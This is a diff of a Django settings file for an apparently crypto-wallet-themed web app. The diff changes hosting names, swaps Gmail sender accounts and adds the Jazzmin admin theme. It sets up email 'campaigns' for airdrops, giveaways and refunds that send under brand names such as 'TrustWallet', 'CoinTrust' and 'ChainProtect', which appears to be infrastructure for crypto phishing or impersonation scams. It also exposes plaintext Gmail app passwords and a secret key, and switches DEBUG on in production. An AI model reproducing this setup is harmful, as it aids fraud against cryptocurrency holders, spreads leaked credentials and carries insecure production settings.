@@ -24,17 +24,18 @@ SECRET_KEY = 'django-insecure-wu70r19c=ua@4!js2gijsibhr$bq&6k!$5=nym2ojk1wuz1=(g
 AUTH_USER_MODEL = 'account.User'
 
 # SECURITY WARNING: don't run with debug turned on in production!
-DEBUG = False
+DEBUG = True
 
-ALLOWED_HOSTS = ['*', 'https://wallet-nrrw.onrender.com']
+ALLOWED_HOSTS = ['*', 'https://wallet-by1e.onrender.com']
 
-CSRF_TRUSTED_ORIGINS = ['https://wallet-nrrw.onrender.com']
+CSRF_TRUSTED_ORIGINS = ['https://wallet-by1e.onrender.com']
 
 # Application definition
 
 INSTALLED_APPS = [
     'account',
     'core',
+    'jazzmin',
     'django.contrib.admin',
     'django.contrib.auth',
     'django.contrib.contenttypes',
@@ -147,10 +148,10 @@ EMAIL_BACKEND = 'django.core.mail.backends.smtp.EmailBackend'
 EMAIL_HOST = 'smtp.gmail.com'
 EMAIL_PORT = 587
 EMAIL_USE_TLS = 'True'
-EMAIL_HOST_USER = 'cointracker.llc@gmail.com'
+EMAIL_HOST_USER = 'trustwallet.zb@gmail.com'
 # Replace with your Gmail address
-EMAIL_HOST_PASSWORD = 'lmpp zwmt ogxd wjik' # Your Gmail app password
-DEFAULT_FROM_EMAIL = 'Emirex Tools <cointracker.llc@gmail.com>'
+EMAIL_HOST_PASSWORD = 'budp ihxa yakk prji' # Your Gmail app password
+DEFAULT_FROM_EMAIL = 'ChainProtect <trustwallet.zb@gmail.com>'
 
 
 EMAIL_TIMEOUT = 60
@@ -159,8 +160,8 @@ CAMPAIGN_EMAIL_BACKENDS = {
     'AIRDROP': {
         'EMAIL_HOST': 'smtp.gmail.com',
         'EMAIL_PORT': 587,
-        'EMAIL_HOST_USER': 'Airdrop cointracker.llc@gmail.com',
-        'EMAIL_HOST_PASSWORD': 'lmpp zwmt ogxd wjik',
+        'EMAIL_HOST_USER': 'Airdrop trustwallet.zb@gmail.com',
+        'EMAIL_HOST_PASSWORD': 'budp ihxa yakk prji',
         'EMAIL_USE_TLS': True,
           # Timeout in seconds
 
@@ -168,18 +169,61 @@ CAMPAIGN_EMAIL_BACKENDS = {
     'GIVEAWAY': {
         'EMAIL_HOST': 'smtp.gmail.com',
         'EMAIL_PORT': 587,
-        'EMAIL_HOST_USER': 'TrustWallet cointracker.llc@gmail.com',
-        'EMAIL_HOST_PASSWORD': 'lmpp zwmt ogxd wjik',
+        'EMAIL_HOST_USER': 'TrustWallet trustwallet.zb@gmail.com',
+        'EMAIL_HOST_PASSWORD': 'budp ihxa yakk prji',
         'EMAIL_USE_TLS': True,
     },
     'REFUND': {
         'EMAIL_HOST': 'smtp.gmail.com',
         'EMAIL_PORT': 587,
-        'EMAIL_HOST_USER': 'CoinTrust cointracker.llc@gmail.com',
-        'EMAIL_HOST_PASSWORD': 'lmpp zwmt ogxd wjik',
+        'EMAIL_HOST_USER': 'CoinGuard trustwallet.zb@gmail.com',
+        'EMAIL_HOST_PASSWORD': 'budp ihxa yakk prji',
         'EMAIL_USE_TLS': True,
     },
 
 }
 
 #JAZZMIN SETUP
+JAZZMIN_SETTINGS = {
+    "site_title": "My Django Admin",          # The title in the browser tab
+    "site_header": "My Project Admin",        # The header text on the top-left corner
+    "site_logo": "your_app/logo.png",         # Path to your custom logo, if any
+    "welcome_sign": "Welcome to the admin panel",  # Welcome message
+    "copyright": "My Project Admin",          # Footer text
+    "search_model": "auth.User",              # Enable search for users (or any other model)
+    "user_avatar": None,                      # Path to avatar image field (if you have user avatars)
+    "show_ui_builder": True,                 # Disable UI Builder
+}
+
+# Optional Jazzmin UI tweaks (this part is optional)
+JAZZMIN_UI_TWEAKS = {
+    "navbar_small_text": False,
+    "footer_small_text": False,
+    "body_small_text": False,
+    "brand_small_text": False,
+    "brand_colour": False,
+    "accent": "accent-primary",
+    "navbar": "navbar-dark",
+    "no_navbar_border": False,
+    "navbar_fixed": False,
+    "layout_boxed": False,
+    "footer_fixed": False,
+    "sidebar_fixed": True,
+    "sidebar": "dark",
+    "sidebar_nav_small_text": True,
+    "sidebar_disable_expand": False,
+    "sidebar_nav_child_indent": False,
+    "sidebar_nav_compact_style": False,
+    "sidebar_nav_legacy_style": False,
+    "sidebar_nav_flat_style": False,
+    "theme": "cyborg",
+    "dark_mode_theme": None,
+    "button_classes": {
+        "primary": "btn-primary",
+        "secondary": "btn-secondary",
+        "info": "btn-info",
+        "warning": "btn-warning",
+        "danger": "btn-danger",
+        "success": "btn-success"
+    }
+}
